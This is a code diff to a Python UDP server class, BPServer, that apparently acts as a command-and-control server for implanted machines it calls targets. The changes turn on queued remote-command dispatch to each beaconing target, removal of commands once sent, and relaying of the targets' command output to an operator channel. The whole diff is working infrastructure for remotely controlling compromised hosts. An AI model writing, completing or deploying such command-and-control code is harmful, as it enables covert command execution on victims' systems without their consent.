@@ -36,13 +36,13 @@ class BPServer(Thread):
         """
         self.sock = socket.socket(socket.AF_INET,
                                   socket.SOCK_DGRAM)
-        self.sock.bind(("0.0.0.0", self.udp_port))
-        self.sock.setblocking(0)
+        self.sock.bind(("", self.udp_port))
+        # self.sock.setblocking(0)
         self.sock.settimeout(.1)
         target_cmds = {}
         while self.is_listening:
             try:
-                data, address = self.sock.recvfrom(1024)
+                data, address = self.sock.recvfrom(4096)
             except socket.timeout:
                 try:
                     push_stage = self.push_queue.get_nowait()
@@ -59,7 +59,10 @@ class BPServer(Thread):
             except:
                 continue
             if len(target_cmds) == 0:
-                pass
+                try:
+                    target_cmds = self.execution_queue.get_nowait()
+                except queue.Empty:
+                    pass
             cur_target = address[0]
             target_address = bytes(map(int, cur_target.split('.')))
             cmd_num = data[6:10]
@@ -70,16 +73,16 @@ class BPServer(Thread):
                         length = len(cmd).to_bytes(2, byteorder='big')
                         packet = MAGIC_BYTES + RAW_COMMAND_BYTE + b'\x01' + cmd_num + target_address + length + cmd
                         self.sock.sendto(packet, address)
-                    # target_cmds.pop(cur_target)
+                    target_cmds.pop(cur_target)
                 except KeyError:
                     packet = MAGIC_BYTES + KEEP_ALIVE_BYTE + b'\x01' + cmd_num + target_address
                     self.sock.sendto(packet, address)
             elif MAGIC_BYTES in data[0:4] and RESPONSE_BYTE == data[4:5]:
                 response_len = int.from_bytes(data[13:15], byteorder='big')
                 response = data[15:15 + response_len].decode('utf-8')
-                # target_responses[cur_target].append(response)
-                # pipe.send(target_responses)
-
+                self.lock.acquire()
+                self.rooms.send(f'RESPONSE {address[0]} {response}')
+                self.lock.release()
             self.lock.acquire()
             try:
                 self.rooms.send(f'Target {address[0]}')
